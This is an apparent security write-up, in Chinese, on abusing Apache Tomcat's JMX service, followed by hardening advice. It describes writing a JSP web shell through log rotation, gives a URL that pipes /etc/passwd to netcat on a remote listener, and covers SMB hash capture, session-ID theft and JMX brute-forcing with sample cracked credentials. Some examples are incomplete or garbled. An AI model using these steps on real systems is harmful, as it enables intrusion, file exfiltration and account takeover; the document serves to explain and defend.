### 攻击者滥用Tomcat JMX服务创建恶意JSP文件

攻击者可以利用Tomcat JMX服务在提供网络服务的目录中创建一个Java Server Page (JSP)文件，通过该文件执行任意命令。具体步骤如下：

1. **破坏Tomcat访问日志**：
   - 使用包含有效JSP代码的请求来污染Tomcat的访问日志。
   - 例如，使用Burp Suite Repeater发送以下请求（假设Tomcat运行在80/tcp端口）：
     ```
     GET / HTTP/1.1
     Host: example.com
     ```

2. **确定JSP文件存储路径**：
   - 利用JConsole界面中的信息找到可靠的路径。
   - 在JConsole的VM Summary选项卡中查看`catalina.base`属性，该属性指向Tomcat的基本目录。
   - 通常，`catalina.base`目录下有一个`webapps`文件夹，其中包含Tomcat提供的各种网络服务。

3. **创建并测试JSP文件**：
   - 将JSP文件存储在适当的目录中，例如：
     ```
     /opt/bitnami/apache-tomcat/webapps/docs/test.jsp
     ```
   - 通过浏览器访问该JSP文件以执行命令。例如，以下URL将读取`/etc/passwd`的内容并通过netcat发送到远程监听器：
     ```
     http://192.168.11.141/docs/test.jsp?cmd=sh%20-c%20$@|sh%20.%20echo%20/bin/cat%20/etc/passwd%20|%20nc%20192.168.11.136%208080
     ```

### 捕获SMB Challenge-Response Hashes

如果Tomcat服务器运行在Windows上，可以通过JSP shell和rotate函数捕获SMB challenge-response哈希值。步骤如下：

1. **启动Metasploit SMB Capture Auxiliary Module**：
   - 在Kali虚拟机上启动Metasploit的SMB捕获辅助模块。

2. **使用JConsole执行JMX连接**：
   - 使用JConsole连接到Tomcat JMX服务，并使用以下参数调用rotate函数：
     ```
     \192.168.11.136test
     ```
   - 上述IP地址是Kali虚拟机的地址。这将触发Tomcat向远程IP发送请求，从而捕获SMB challenge-response哈希值。

### 通过创建其他文件类型进行客户端攻击

rotate函数还可以用于创建HTML文件等敏感文件，以在网络应用中执行跨站脚本攻击（XSS）。具体步骤如下：

1. **污染日志文件**：
   - 使用有效的HTML代码污染Tomcat的日志文件。

2. **存储HTML文件**：
   - 将HTML文件存储在Tomcat的网络应用程序目录中。

### 抓取网络应用用户的Session ID

攻击者可以利用Tomcat JMX操作劫持网络应用用户的会话。具体步骤如下：

1. **使用listSessionIds()操作**：
   - 在Catalina节点下找到`Manager->[ApplicationName]->Operations->listSessionIds()`操作。
   - 该操作返回所有连接到该应用的用户的JSESSIONID。

2. **劫持会话**：
   - 攻击者可以使用获取到的JSESSIONID冒充其他用户。

### 暴力破解进入Tomcat JMX

即使Tomcat JMX服务配置了认证，也容易受到暴力破解攻击。作者开发了一个名为jmxbf的工具来演示这一点。使用方法如下：

```
java -jar jmxbf.jar -h <JMX server IP> -p <port> -uf <usernames file> -pf <passwords file>
```

示例输出：
```
Auth failed!!!
...
###SUCCESS### - We got a valid connection for: control:supersecretpwd
Found some valid credentials - continuing brute force
...
The following valid credentials were found:
control:supersecretpwd
monitor:monitor
```

### 建议的安全措施

1. **防火墙限制**：
   - 只允许白名单IP地址访问JMX服务。

2. **启用强密码认证**：
   - 在Windows上设置强密码认证：
     ```bat
     SET JAVA_OPTS=%JAVA_OPTS% -Dcom.sun.management.jmxremote.authenticate=true -Dcom.sun.management.jmxremote.password.file=%CATALINA_BASE%/conf/jmxremote.password -Dcom.sun.management.jmxremote.access.file=%CATALINA_BASE%/conf/jmxremote.access
     ```
   - 在Linux上设置强密码认证：
     ```sh
     CATALINA_OPTS="-Dcom.sun.management.jmxremote.authenticate=true -Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password -Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access"
     ```

3. **启用SSL**：
   - 设置`jmxremote.ssl=true`以保护认证过程。

4. **严格控制rotate函数**：
   - 限制rotate函数只能在特定的日志文件夹中创建文件，并且这些文件不能通过URL访问。

5. **存储哈希版本的密码**：
   - 使用digest工具生成哈希版本的密码：
     ```
     digest.bat -s 0 -i 1 themanagersecretpassword
     ```

通过以上措施，可以显著提高Tomcat服务器的安全性，防止攻击者滥用JMX服务进行攻击。